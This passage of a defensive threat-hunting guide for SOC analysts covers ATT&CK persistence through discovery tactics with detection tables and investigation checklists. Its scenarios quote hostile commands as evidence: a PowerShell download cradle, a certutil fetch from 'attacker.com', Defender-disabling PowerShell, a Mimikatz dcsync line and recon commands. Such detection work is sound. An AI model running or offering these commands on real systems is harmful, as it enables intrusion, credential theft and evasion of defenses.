   □ What is the trigger? (time-based, logon-based, event-based)
   □ What is the action? (binary path, arguments)
   □ Is it running as SYSTEM?

2. ANALYZE THE PAYLOAD
   □ Read contents of update.bat
   □ Does it download/execute additional payloads?
   □ Does it establish network connections (C2)?
   □ Does it invoke PowerShell with encoded commands?
   □ Hash the file and check VirusTotal

3. ASSESS LEGITIMACY
   □ Is "WindowsDefenderHealthCheck" a real Windows task? → NO
   □ Windows Defender tasks are in a different path → SUSPICIOUS
   □ Was this created during a change management window? → CHECK
   □ Does the IT team recognize this task? → ASK

4. CHECK FOR RELATED ACTIVITY
   □ What else did the creator account do before/after?
   □ Check process tree when the task executes
   □ Check for network connections during execution
   □ Search for same task name/payload across all endpoints
   □ Check if this is part of a broader compromise

5. RESPOND
   □ Disable the scheduled task immediately
   □ Capture the payload file for forensic analysis
   □ Check if the task executed and what it did
   □ Block the creator account if compromised
   □ Hunt for same persistence across all DCs and servers
   □ Create detection rule for task creation on DCs by non-admin accounts
```

**TP Confidence:** 🔴 CRITICAL — Fake Windows Defender task on DC running batch file from ProgramData = confirmed persistence.

#### ✅ True Positive Scenario — New Service Created (T1543.003)

**Scenario:** Event 7045 shows a new service named `SystemHealthMonitor` installed on a file server. The service binary path is: `cmd.exe /c powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"`.

**Investigation Steps:**
```
1. EXAMINE THE SERVICE
   □ Event 7045 details: service name, display name, binary path, account
   □ Service binary = cmd.exe launching PowerShell → 🔴 CRITICAL
   □ PowerShell downloads from Pastebin → 🔴 MALICIOUS
   □ Who installed the service? (correlate with 4688/Sysmon)

2. DETERMINE IF SERVICE EXECUTED
   □ Check if the service started (Event 7036: service started)
   □ Check PowerShell logs (4104) for script block logging
   □ Check proxy logs for connection to pastebin.com
   □ Check EDR for process tree: services.exe → cmd.exe → powershell.exe

3. ANALYZE THE PAYLOAD
   □ Access the Pastebin URL (from sandboxed environment)
   □ What does the downloaded script do?
   □ Does it install additional persistence? Drop tools? Exfil data?

4. SCOPE THE COMPROMISE
   □ Search for same service name across all servers
   □ Check for other services with PowerShell in binary path
   □ Review the installing account's full activity timeline
   □ Look for lateral movement from/to this server

5. RESPOND
   □ Stop and disable the service
   □ Isolate the server from the network
   □ Delete the service registration
   □ Block pastebin.com raw URL at proxy (or specific URL)
   □ Reset credentials of the installing account
   □ Full forensic investigation of the server
   □ Hunt for same pattern environment-wide
```

**TP Confidence:** 🔴 CRITICAL — Service executing PowerShell download cradle from Pastebin = textbook persistence mechanism.

#### ✅ True Positive Scenario — Web Shell Deployed (T1505.003)

**Scenario:** File integrity monitoring alerts on a new file `error_handler.aspx` created in `C:\inetpub\wwwroot\` on the Exchange OWA server. The file was not part of any patch or deployment.

**Investigation Steps:**
```
1. EXAMINE THE FILE
   □ When was the file created? (check MFT/$SI timestamps)
   □ What process created it? (check Sysmon Event 11)
   □ Analyze file content: does it contain eval(), exec(), cmd functions?
   □ Hash the file → check VirusTotal for web shell signatures
   □ Compare to known web shell families (China Chopper, ASPXSPY, etc.)

2. CHECK WEB SERVER ACTIVITY
   □ Review IIS logs for requests to error_handler.aspx
   □ Who accessed it? Note source IPs
   □ What POST data was sent? (command execution?)
   □ Any authentication bypass patterns?

3. DETERMINE INITIAL ACCESS
   □ How did the attacker write to wwwroot?
   □ Check for ProxyShell/ProxyLogon/ProxyNotShell exploitation evidence
   □ Review Exchange health check results
   □ Check for CVE exploitation in IIS/Exchange logs

4. ASSESS IMPACT
   □ What commands were executed through the web shell?
   □ Was data exfiltrated?
   □ Was the web shell used to move laterally?
   □ Were additional web shells planted?

5. RESPOND
   □ Remove the web shell file (preserve copy for forensics)
   □ Patch the vulnerability used for initial access
   □ Search for other web shells in all web directories
   □ Review and reset all credentials on the Exchange server
   □ Check for privilege escalation from IIS service account
   □ Full Exchange security audit
   □ Create file integrity monitoring rule for web directories
```

**TP Confidence:** 🔴 CRITICAL — Unauthorized .aspx file in wwwroot on Exchange server = confirmed web shell.

---

## 7. TA0004 — Privilege Escalation

#### Overview
Adversaries elevate their access level from standard user to admin, SYSTEM, or domain admin. This is a **pivotal** moment in the attack chain — stopping privilege escalation limits the adversary's capabilities significantly.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1548.002 | Bypass UAC | Elevate from medium to high integrity | EDR, Sysmon |
| T1068 | Exploitation for Privilege Escalation | Exploit kernel/software vuln | EDR, Crash dumps |
| T1134 | Access Token Manipulation | Steal/impersonate tokens | Sysmon, Event 4688 |
| T1078 | Valid Accounts | Use admin creds obtained earlier | Auth logs (4624 Type 10, 3) |
| T1484 | Domain Policy Modification | Modify GPO for privilege | Event 5136, GPO audit |
| T1055 | Process Injection | Inject code into privileged process | EDR, Sysmon (Event 8, 10) |
| T1547.001 | Boot/Logon Autostart: Registry | Add to HKLM Run as SYSTEM | Sysmon 13 |
| T1611 | Escape to Host | Container escape to host OS | Container runtime logs, EDR |
| T1078.002 | Domain Accounts | Compromise domain admin creds | Active Directory logs |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| UAC bypass | EDR/Sysmon | Auto-elevating binaries spawning unexpected children (fodhelper.exe, eventvwr.exe, sdclt.exe) |
| Token manipulation | Sysmon/EDR | Processes using token impersonation (SeImpersonatePrivilege exploitation) |
| Kerberoasting → Admin | AD logs | 4769 (TGS requests) for SPNs of admin service accounts, followed by admin logon |
| DCSync | AD logs | DRS replication request from non-DC machine (Event 4662 with DS-Replication-Get-Changes) |
| GPO modification | Event 5136 | Unauthorized GPO changes granting privileges or deploying scripts |
| Process injection | Sysmon Event 8 | CreateRemoteThread into LSASS, SYSTEM processes, or browsers |
| Potato attacks | EDR | Named pipe impersonation (PrintSpoofer, JuicyPotato, SweetPotato) |

#### ✅ True Positive Scenario — UAC Bypass via Fodhelper (T1548.002)

**Scenario:** EDR detects `fodhelper.exe` (a Microsoft auto-elevating binary) spawning `cmd.exe` with high integrity. The user account is a standard domain user on a workstation.

**Investigation Steps:**
```
1. ANALYZE THE PROCESS CHAIN
   □ Process tree: explorer.exe → fodhelper.exe → cmd.exe (HIGH INTEGRITY)
   □ Check if registry key was modified before execution:
     HKCU\Software\Classes\ms-settings\shell\open\command
   □ What command was set in the registry? (the actual payload)
   □ This is a well-known UAC bypass technique → 🔴

2. CHECK PRE-BYPASS ACTIVITY
   □ How did the attacker get to this point?
   □ Check for initial access vector (phishing, exploitation?)
   □ What commands were run before the UAC bypass?
   □ What user account was used?

3. POST-BYPASS INVESTIGATION
   □ What elevated commands were executed after bypass?
   □ Check for credential dumping (LSASS access)
   □ Check for persistence creation (now with admin rights)
   □ Check for security tool tampering (disabling AV/EDR)
   □ Check for lateral movement attempts

4. RESPOND
   □ Isolate the endpoint
   □ Kill the malicious process tree
   □ Clean the registry modification
   □ Determine full scope of compromise
   □ Check for same technique on other workstations
   □ Reset user credentials
   □ Create detection for fodhelper UAC bypass pattern
```

**TP Confidence:** 🔴 CRITICAL — Registry modification + fodhelper.exe spawning elevated cmd.exe = confirmed UAC bypass.

#### ✅ True Positive Scenario — Kerberoasting Leading to Domain Admin (T1558.003)

**Scenario:** SIEM detects a workstation issuing 50+ TGS (Kerberos Ticket Granting Service) requests in 2 minutes, requesting tickets for multiple service accounts including `svc_sql_admin`, `svc_backup`, and `svc_exchange`.

**Investigation Steps:**
```
1. IDENTIFY KERBEROASTING
   □ Event 4769 (Kerberos Service Ticket Operations)
   □ Filter for encryption type: 0x17 (RC4-HMAC) → weak, crackable
   □ High volume of TGS requests from single workstation → 🔴
   □ Requests for multiple SPNs in short timeframe → KERBEROASTING

2. CHECK THE SOURCE
   □ Which workstation/user initiated the requests?
   □ What tool was used? (Rubeus, Invoke-Kerberoast, GetUserSPNs.py)
   □ Check for PowerShell or command line evidence
   □ Is this a normal admin activity? → Almost certainly NOT

3. ASSESS CRACKING RISK
   □ Which service accounts had tickets requested?
   □ Are these accounts domain admins or have elevated privileges?
   □ What are the password policies for these service accounts?
   □ Were passwords complex enough to resist cracking?

4. CHECK FOR FOLLOW-UP
   □ After Kerberoasting: did any service accounts log in from unusual sources?
   □ Check 4624 events for service accounts from workstations (not servers)
   □ Check for privilege escalation with cracked credentials
   □ Check for lateral movement using service accounts

5. RESPOND
   □ Force password reset on ALL targeted service accounts immediately
   □ Change to complex passwords (25+ characters)
   □ Investigate the source workstation for compromise
   □ Convert service accounts to Group Managed Service Accounts (gMSA)
   □ Disable RC4 encryption for Kerberos (require AES)
   □ Enable Kerberoasting detection rule in SIEM
   □ Review all SPNs for unnecessary registrations
   □ Isolate the source workstation
```

**TP Confidence:** 🔴 CRITICAL — Mass TGS requests with RC4 encryption for multiple service accounts = confirmed Kerberoasting.

---

## 8. TA0005 — Defense Evasion

#### Overview
Adversaries attempt to **avoid detection** by disabling security tools, obfuscating code, clearing logs, masquerading as legitimate processes, and using living-off-the-land techniques. This is the **most diverse** tactic with 40+ techniques.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1562.001 | Disable/Modify Security Tools | Disable AV, EDR, firewall | EDR tamper protection, Event 7045 |
| T1070.001 | Clear Windows Event Logs | Delete evidence | Event 1102 (Security log cleared) |
| T1070.004 | File Deletion | Remove tools after use | Sysmon 23 (File Delete), EDR |
| T1036 | Masquerading | Rename malware to look legitimate | Sysmon 1, EDR (hash mismatch) |
| T1027 | Obfuscated Files/Information | Encode/encrypt payloads | Script logging (4104), EDR |
| T1218 | System Binary Proxy Execution | Use LOLBins (mshta, rundll32) | Sysmon 1, EDR |
| T1055 | Process Injection | Inject code into legitimate process | Sysmon 8, 10, EDR |
| T1140 | Deobfuscate/Decode Files | Decode payload at runtime | EDR, Script logging |
| T1112 | Modify Registry | Alter configs to disable security | Sysmon 13 |
| T1497 | Virtualization/Sandbox Evasion | Detect analysis environment | EDR (anti-analysis behavior) |
| T1564.001 | Hidden Files and Directories | Hide tools in hidden paths | File system audit |
| T1202 | Indirect Command Execution | Use forfiles, pcalua, etc. | Sysmon 1, EDR |
| T1553.002 | Code Signing | Use stolen/forged certificates | Sysmon 7, Certificate audit |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Security log clearing | Event 1102, 104 | Any security/system log cleared (ALWAYS investigate) |
| AV/EDR tampering | EDR tamper logs | Services stopped (Defender, CrowdStrike, SentinelOne), exclusions added |
| Masquerading | Sysmon 1 | Processes with legitimate names running from unusual paths (svchost.exe from C:\TEMP) |
| LOLBin abuse | Sysmon 1 | mshta.exe, rundll32.exe, certutil.exe, regsvr32.exe with download/exec arguments |
| Process injection | Sysmon 8, 10 | CreateRemoteThread/OpenProcess to sensitive processes (LSASS, winlogon.exe) |
| AMSI bypass | PowerShell 4104 | Scripts containing `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer` |
| Timestomping | NTFS analysis | $SI timestamp differs from $FN timestamp on suspicious files |
| Defender exclusions | Registry/MDI | New exclusions added to Windows Defender via PowerShell or registry |

#### ✅ True Positive Scenario — Security Event Logs Cleared (T1070.001)

**Scenario:** SIEM fires Event 1102 (The audit log was cleared) on a domain controller. The log was cleared at 2:47 AM by user `svc_backup`.

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT — THIS IS ALWAYS SERIOUS ON A DC
   □ Event 1102 details: Who cleared the log? When? From which session?
   □ Clearing Security logs on a DC is NEVER normal → 🔴 CRITICAL
   □ This is anti-forensic behavior → assume active compromise
   □ Check if other logs were also cleared (System, PowerShell, Sysmon)

2. INVESTIGATE THE ACCOUNT
   □ Is svc_backup a legitimate service account?
   □ When did svc_backup last authenticate? From where?
   □ Check 4624 events before the clearing (source IP, logon type)
   □ Was svc_backup's password recently changed?
   □ Does svc_backup normally log into DCs interactively?

3. RECOVER EVIDENCE
   □ Check if Sysmon logs are still intact (separate log channel)
   □ Check centralized SIEM — logs forwarded before clearing
   □ Check other DCs for related activity
   □ Review network logs (firewall, DNS, proxy) for the DC
   □ Check EDR telemetry for the DC

4. RECONSTRUCT PRE-CLEARING ACTIVITY
   □ What happened on the DC before logs were cleared?
   □ Check for DCSync (Event 4662 with Replication permissions)
   □ Check for NTDS.dit access or shadow copy creation
   □ Check for account creation or privilege escalation
   □ Check for Golden Ticket / Pass-the-Hash indicators

5. RESPOND — TREAT AS CRITICAL INCIDENT
   □ Escalate to IR team immediately
   □ Reset svc_backup password
   □ Reset KRBTGT password (twice with 12-hour interval)
   □ Audit all privileged accounts on the DC
   □ Full forensic acquisition of the DC
   □ Check all DCs for compromise indicators
   □ Enable enhanced logging and tamper protection
   □ Consider the entire domain potentially compromised
```

**TP Confidence:** 🔴 CRITICAL — Security logs cleared on a domain controller = ALWAYS treat as active compromise.

#### ✅ True Positive Scenario — LOLBin Abuse: Certutil for Download (T1218, T1105)

**Scenario:** EDR alerts on `certutil.exe` executing with the following command line on a workstation:
```
certutil.exe -urlcache -split -f http://attacker.com/payload.dll C:\Users\Public\payload.dll
```

**Investigation Steps:**
```
1. ANALYZE THE COMMAND
   □ certutil.exe used as download tool → classic LOLBin abuse
   □ -urlcache -split -f = download mode
   □ Source: http://attacker.com/payload.dll → external URL
   □ Destination: C:\Users\Public → world-writable directory
   □ This is MALICIOUS → 🔴

2. CHECK EXECUTION CONTEXT
   □ What user ran this command?
   □ What was the parent process? (cmd.exe? powershell.exe? wscript.exe?)
   □ Check full process hierarchy to determine root cause
   □ Was this human-initiated or automated?

3. ANALYZE THE PAYLOAD
   □ Was payload.dll successfully downloaded? (check file system)
   □ Hash the DLL → check VirusTotal
   □ Was the DLL executed? (check Sysmon Event 1 for rundll32 or 7 for DLL load)
   □ Submit to sandbox for analysis

4. NETWORK INVESTIGATION
   □ Check DNS for attacker.com resolution
   □ Check proxy/firewall logs for the download
   □ Was the download successful (HTTP 200)?
   □ Check for subsequent C2 connections from the host

5. RESPOND
   □ Isolate the workstation
   □ Delete the downloaded payload
   □ Block attacker.com at DNS and proxy
   □ Block the payload hash at EDR
   □ Check for same domain/C2 across all endpoints
   □ Create detection for certutil download pattern
   □ Consider application control / AppLocker for certutil
```

**TP Confidence:** 🔴 HIGH — Certutil downloading DLL from external URL to Users\Public = confirmed LOLBin abuse.

#### ✅ True Positive Scenario — Disabling Windows Defender (T1562.001)

**Scenario:** SIEM observes the following PowerShell command executed on a server:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Crypto"
```

**Investigation Steps:**
```
1. IMMEDIATE ASSESSMENT
   □ Three-pronged Defender disablement:
     - Real-time monitoring disabled
     - AntiSpyware policy disabled via registry
     - Exclusion added for specific path
   □ This is DEFENSIVE PREPARATION before payload deployment → 🔴

2. CHECK WHAT FOLLOWED
   □ What files were created/modified in C:\ProgramData\Microsoft\Crypto?
   □ Was malware dropped in the excluded path?
   □ Check for additional tool deployment (Mimikatz, Cobalt Strike)
   □ Check for lateral movement from this server

3. INVESTIGATE THE ACTOR
   □ Who ran these commands? (user from 4688/4104)
   □ How did they get access to the server?
   □ What privileges do they have?
   □ Check their activity timeline (before and after)

4. SCOPE ASSESSMENT
   □ Were Defender settings modified on other servers/workstations?
   □ Search for same PowerShell commands across environment
   □ Check for similar exclusion paths on other endpoints
   □ Has the adversary deployed ransomware preparation?

5. RESPOND
   □ Re-enable Windows Defender immediately
   □ Remove the malicious exclusion
   □ Remove the DisableAntiSpyware registry key
   □ Scan the excluded directory (C:\ProgramData\Microsoft\Crypto)
   □ Isolate the server if malware is confirmed
   □ Enable Defender Tamper Protection
   □ Deploy GPO to prevent local Defender modification
   □ Hunt for ransomware preparation indicators
```

**TP Confidence:** 🔴 CRITICAL — Systematic Defender disablement = adversary preparing for payload deployment.

---

## 9. TA0006 — Credential Access

#### Overview
Stealing credentials is often the **primary objective** of adversaries after initial access. With valid credentials, attackers can move laterally, escalate privileges, and maintain persistence — all while appearing as legitimate users.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1003.001 | OS Credential Dumping: LSASS | Dump LSASS process memory | Sysmon 10, EDR |
| T1003.002 | SAM Database | Extract local account hashes | Sysmon 1, Event 4688 |
| T1003.003 | NTDS.dit | Extract AD database (all domain hashes) | Event 4662, Volume Shadow Copy |
| T1003.006 | DCSync | Simulate DC replication to steal hashes | Event 4662 (DS-Replication) |
| T1558.003 | Kerberoasting | Request/crack service account TGS tickets | Event 4769 (RC4) |
| T1558.004 | AS-REP Roasting | Crack accounts without pre-auth | Event 4768 |
| T1110 | Brute Force | Password spraying, credential stuffing | Event 4625 (mass failures) |
| T1555 | Credentials from Password Stores | Browser creds, vault, credential mgr | EDR, File access logs |
| T1556 | Modify Authentication Process | Password filter DLL, SSP | Registry, EDR |
| T1539 | Steal Web Session Cookie | Extract browser session tokens | EDR, Browser forensics |
| T1552.001 | Credentials in Files | Search for passwords in config files | EDR, File access logs |
| T1557.001 | LLMNR/NBT-NS Poisoning | Responder-style credential interception | Network monitor, Event 4624 |
| T1187 | Forced Authentication | Force NTLM auth to attacker | Network logs, Sysmon 3 |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| LSASS access | Sysmon Event 10 | GrantedAccess to LSASS process with 0x1010 or 0x1FFFFF (full access) |
| Mimikatz patterns | EDR/Sysmon | Process creating `sekurlsa::logonpasswords`, `lsadump::dcsync` strings |
| Password spraying | Event 4625 | Same password tried against 10+ accounts in < 10 min |
| DCSync | Event 4662 | DS-Replication-Get-Changes-All from non-DC computer account |
| SAM/SECURITY hive dump | Event 4688/Sysmon 1 | reg.exe save HKLM\SAM, HKLM\SECURITY, or NTDS.dit copy |
| Credential file hunting | EDR | findstr /si "password" in config files, batch scripts |
| NTDS.dit extraction | Event 4688 | ntdsutil, vssadmin create shadow, esentutl usage on DC |
| Kerberoasting | Event 4769 | TGS requests with 0x17 (RC4) for multiple service SPNs |
| AS-REP Roasting | Event 4768 | AS-REP responses without pre-authentication |
| Responder/LLMNR poisoning | Network | LLMNR (5355) or NBT-NS (137) responses from non-DNS servers |

#### ✅ True Positive Scenario — LSASS Credential Dumping (T1003.001)

**Scenario:** Sysmon Event 10 fires showing process `rundll32.exe` accessing `lsass.exe` with GrantedAccess `0x1FFFFF` (PROCESS_ALL_ACCESS). The calling process path is `C:\Windows\Temp\debug.dll` loaded via `rundll32.exe C:\Windows\Temp\debug.dll,MiniDump`.

**Investigation Steps:**
```
1. CONFIRM LSASS ACCESS
   □ Sysmon Event 10: SourceImage, TargetImage = lsass.exe
   □ GrantedAccess = 0x1FFFFF (full access) → 🔴 CRITICAL
   □ Source is rundll32 loading DLL from Windows\Temp → ABNORMAL
   □ This is credential dumping behavior → CONFIRMED MALICIOUS

2. ANALYZE THE TOOL
   □ Hash debug.dll → check VirusTotal
   □ Is this Mimikatz, nanodump, lsassy, or custom tool?
   □ When was debug.dll dropped? (Sysmon Event 11)
   □ What process dropped it?

3. CHECK FOR DUMP FILE
   □ Was a minidump file created? (check for .dmp files)
   □ Where was the dump saved? (TEMP, user profile)
   □ Was the dump exfiltrated? (check network logs)

4. ASSESS BLAST RADIUS
   □ LSASS memory contains: NTLM hashes, Kerberos tickets, plaintext creds
   □ ALL users who logged into this machine are compromised
   □ List all users with recent logon sessions on this host
   □ Check 4624 events for logon type 2, 10, 7 (interactive, remote, reconnect)

5. POST-DUMP ACTIVITY
   □ Check for Pass-the-Hash (4624 Type 3 with NTLM)
   □ Check for lateral movement from this host
   □ Check for Golden Ticket / Silver Ticket usage
   □ Check for privilege escalation with dumped creds

6. RESPOND — TREAT AS CRITICAL
   □ Isolate the endpoint immediately
   □ Delete debug.dll and any dump files
   □ Reset passwords for ALL users who logged into this machine
   □ Reset the KRBTGT account if domain admin creds were dumped
   □ Force Kerberos ticket renewal
   □ Hunt for same tool/hash across the environment
   □ Enable Credential Guard if possible
   □ Enable LSASS PPL (Protected Process Light)
   □ Create detection for LSASS access patterns
```

**TP Confidence:** 🔴 CRITICAL — Full access to LSASS from a temp DLL via rundll32 = confirmed credential dumping.

#### ✅ True Positive Scenario — DCSync Attack (T1003.006)

**Scenario:** Event 4662 on a domain controller shows replication rights (`DS-Replication-Get-Changes-All`) exercised by computer account `WORKSTATION12$` — which is a standard workstation, NOT a domain controller.

**Investigation Steps:**
```
1. CONFIRM DCSYNC
   □ Event 4662: Object Type = Domain
   □ Properties include: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
     = DS-Replication-Get-Changes-All → 🔴
   □ Account performing replication: WORKSTATION12$ → NOT A DC → 🔴 CRITICAL
   □ Only domain controllers should perform replication

2. IDENTIFY THE ATTACKER'S TOOL
   □ What process on WORKSTATION12 initiated the replication?
   □ Check Sysmon logs on WORKSTATION12 for Mimikatz/Rubeus/SharpKatz
   □ Common commands: lsadump::dcsync /domain:corp.com /user:krbtgt

3. DETERMINE WHAT WAS REPLICATED
   □ What user accounts were targeted?
   □ Was KRBTGT replicated? (enables Golden Ticket)
   □ Were domain admin accounts replicated?
   □ Check for multiple 4662 events (one per account replicated)

4. ASSESS IMPACT — THIS IS DOMAIN COMPROMISE
   □ IF KRBTGT was replicated → adversary can create Golden Tickets
   □ IF Domain Admin was replicated → immediate full domain access
   □ ALL replicated account passwords must be considered stolen

5. RESPOND — CRITICAL INCIDENT
   □ Isolate WORKSTATION12 immediately
   □ This is a P1/SEV1 incident → escalate to IR team
   □ Reset ALL replicated account passwords
   □ Reset KRBTGT password (twice, 12-hour interval)
   □ Reset Domain Admin passwords
   □ Full investigation of WORKSTATION12 (how was it compromised?)
   □ Review AD permissions — remove unnecessary replication rights
   □ Enable AD monitoring for replication from non-DC sources
   □ Consider the entire domain COMPROMISED until proven otherwise
   □ Engage executive leadership for incident communication
```

**TP Confidence:** 🔴 CRITICAL — DCSync from non-DC workstation = CONFIRMED DOMAIN COMPROMISE. This is the highest severity finding possible.

#### ✅ True Positive Scenario — Password Spraying Attack (T1110.003)

**Scenario:** SIEM correlation rule fires: 200+ unique accounts experienced 4625 (Logon Failure) with error `0xC000006A` (wrong password) from the same source IP within 15 minutes. 3 accounts then showed successful 4624 logons.

**Investigation Steps:**
```
1. CONFIRM PASSWORD SPRAY PATTERN
   □ Same password attempted against many accounts → spray (not brute force)
   □ Failure reason 0xC000006A (bad password) consistently
   □ Source IP: internal workstation or external?
   □ Time between attempts: automated (< 1 second apart)?
   □ 200+ targets in 15 min → 🔴 AUTOMATED ATTACK TOOL

2. IDENTIFY SUCCESSFUL COMPROMISES
   □ Which 3 accounts had successful logon after failures?
   □ Are these accounts privileged? (admin, service, executive)
   □ What logon type? (Type 3 = network, Type 10 = RDP)
   □ What did the attacker do after successful logon?

3. TRACE THE SOURCE
   □ If internal IP: which endpoint? Who is logged in?
   □ Check for attack tools (Spray, CrackMapExec, Ruler)
   □ If external IP: VPN? Web portal? RDP gateway?
   □ Check if IP is on threat intel blacklists

4. POST-COMPROMISE ACTIVITY
   □ For each compromised account:
     □ Check for lateral movement (4624 from new hosts)
     □ Check for privilege escalation
     □ Check for persistence mechanisms
     □ Check for data access or exfiltration
   □ Did the attacker spray again with compromised account creds?

5. RESPOND
   □ Lock/reset all 3 compromised accounts immediately
   □ Force password change for all targeted accounts
   □ Block the source IP
   □ If internal: isolate the source workstation → investigate
   □ Enable account lockout policy (if not already)
   □ Implement smart lockout / progressive delays
   □ Enforce MFA for all accounts
   □ Review password policy (complexity, length, banned passwords)
   □ Deploy Microsoft AD Password Protection for banned passwords
   □ Create alerting for spray patterns (low-and-slow too)
```

**TP Confidence:** 🔴 HIGH — 200+ failed logins from one source with successful compromises = confirmed password spray.

---

## 10. Defense Evasion & Credential Access — Quick Reference Checklist

### 10.1 Defense Evasion Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│               DEFENSE EVASION HUNTING CHECKLIST                       │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LOG TAMPERING                                                        │
│  □ Search for Event 1102 (Security log cleared)                      │
│  □ Search for Event 104 (System log cleared)                         │
│  □ Check for gaps in event log timeline                              │
│  □ Check for wevtutil or Clear-EventLog commands                     │
│                                                                       │
│  SECURITY TOOL TAMPERING                                              │
│  □ Check for AV/EDR service stoppage or crashes                      │
│  □ Search for Defender exclusion additions (PowerShell, Registry)    │
│  □ Check for tamper protection bypass attempts                       │
│  □ Monitor for driver-based security tool bypass (BYOVD)             │
│                                                                       │
│  PROCESS MASQUERADING                                                 │
│  □ Verify svchost.exe running only from C:\Windows\System32          │
│  □ Verify csrss.exe, lsass.exe in expected paths                    │
│  □ Check for unsigned binaries with Microsoft-like names             │
│  □ Compare file hash vs expected hash for system binaries            │
│                                                                       │
│  LOLBIN ABUSE                                                         │
│  □ Monitor mshta.exe, certutil.exe, bitsadmin.exe for downloads     │
│  □ Monitor rundll32.exe for unusual DLL loads                        │
│  □ Monitor regsvr32.exe for /s /n /u /i:URL patterns                │
│  □ Check for wmic process call create with suspicious commands       │
│                                                                       │
│  OBFUSCATION                                                          │
│  □ Check PowerShell 4104 logs for encoded commands                   │
│  □ Look for string concatenation evasion ("po" + "wer" + "shell")   │
│  □ Check for AMSI bypass patterns in script logs                     │
│  □ Monitor for base64 decode operations (certutil -decode)           │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 10.2 Credential Access Detection Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│              CREDENTIAL ACCESS HUNTING CHECKLIST                      │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  LSASS / CREDENTIAL DUMPING                                           │
│  □ Monitor Sysmon 10 for LSASS access (0x1010, 0x1FFFFF)            │
│  □ Check for procdump.exe, comsvcs.dll MiniDump usage                │
│  □ Monitor for .dmp files created in temp directories                │
│  □ Check for task manager creating LSASS dump                        │
│                                                                       │
│  ACTIVE DIRECTORY ATTACKS                                             │
│  □ Monitor Event 4769 for mass TGS requests (Kerberoasting)         │
│  □ Monitor Event 4768 for AS-REP roasting patterns                   │
│  □ Monitor Event 4662 for DCSync (replication from non-DC)          │
│  □ Check for NTDS.dit access (vssadmin, ntdsutil)                   │
│                                                                       │
│  BRUTE FORCE / PASSWORD SPRAY                                        │
│  □ Monitor Event 4625 for mass failures (same source, many targets) │
│  □ Check for slow-and-low spray (1 attempt per account per hour)    │
│  □ Monitor for failures followed by success (spray + compromise)    │
│  □ Check for credential stuffing from leaked password lists          │
│                                                                       │
│  CREDENTIAL HARVESTING                                                │
│  □ Check for browser credential file access                         │
│  □ Monitor for credential manager access                             │
│  □ Check for LaZagne, SharpChrome, SharpDPAPI usage                  │
│  □ Monitor for keylogger artifacts                                   │
│                                                                       │
│  NETWORK CREDENTIAL INTERCEPTION                                      │
│  □ Monitor for LLMNR/NBT-NS poisoning (Responder)                   │
│  □ Check for forced NTLM authentication attempts                     │
│  □ Monitor for man-in-the-middle indicators                          │
│  □ Check for ntlmrelayx or similar relay tool artifacts              │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

---

*Continued in Part 3 → Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact — Complete TP Scenarios, Full Investigation Playbooks & SOC Analyst Checklists*


---

# 🎯 Threat Hunting SOC Guide — Part 3: Discovery, Lateral Movement & Collection

---

# PART 3: ATT&CK TACTICS — DISCOVERY, LATERAL MOVEMENT & COLLECTION

---

## 11. TA0007 — Discovery

#### Overview
After gaining access and credentials, adversaries **map the environment** — discovering users, groups, systems, shares, and trust relationships. Discovery commands are often **living-off-the-land** (using built-in OS tools), making them harder to detect.

#### Key Techniques

| Technique ID | Technique | Description | Detection Source |
|-------------|-----------|-------------|-----------------|
| T1087 | Account Discovery | Enumerate local/domain accounts | Event 4688, Sysmon 1 |
| T1082 | System Information Discovery | Hostname, OS version, architecture | Event 4688 (systeminfo, hostname) |
| T1083 | File and Directory Discovery | Browse file systems | EDR, Sysmon 1 (dir, tree) |
| T1069 | Permission Groups Discovery | Enumerate groups (Domain Admins) | Event 4688 (net group) |
| T1018 | Remote System Discovery | Find other machines on network | Event 4688 (net view, ping sweep) |
| T1016 | System Network Configuration | IP config, routes, DNS | Event 4688 (ipconfig, route, nslookup) |
| T1049 | System Network Connections | Active connections | Event 4688 (netstat) |
| T1482 | Domain Trust Discovery | Map AD trust relationships | Event 4688 (nltest /domain_trusts) |
| T1135 | Network Share Discovery | Find accessible shares | Event 4688 (net share, net view) |
| T1046 | Network Service Scanning | Port scan internal network | Firewall, IDS, EDR |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Recon command burst | Sysmon 1 / Event 4688 | Multiple discovery commands from single host in < 5 min: `whoami`, `ipconfig`, `net user`, `net group`, `systeminfo`, `nltest` |
| BloodHound/SharpHound | Event 4688/EDR | SharpHound.exe, or LDAP queries for all users/groups/trusts in rapid succession |
| AD enumeration | LDAP logs | Unusual LDAP queries from workstations (all adminCount=1 objects) |
| Internal port scanning | Firewall/IDS | Single host connecting to many internal IPs on common ports (445, 3389, 22, 80) |
| Share enumeration | Event 5140/5145 | Single user accessing multiple network shares in sequence |

#### ✅ True Positive Scenario — Post-Compromise Enumeration (T1087 + T1069 + T1082)

**Scenario:** EDR detects a workstation executing the following commands in rapid succession within 3 minutes:
```
whoami /all
systeminfo
ipconfig /all
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
nltest /domain_trusts
net view /domain
```

**Investigation Steps:**
```
1. ASSESS THE COMMAND PATTERN
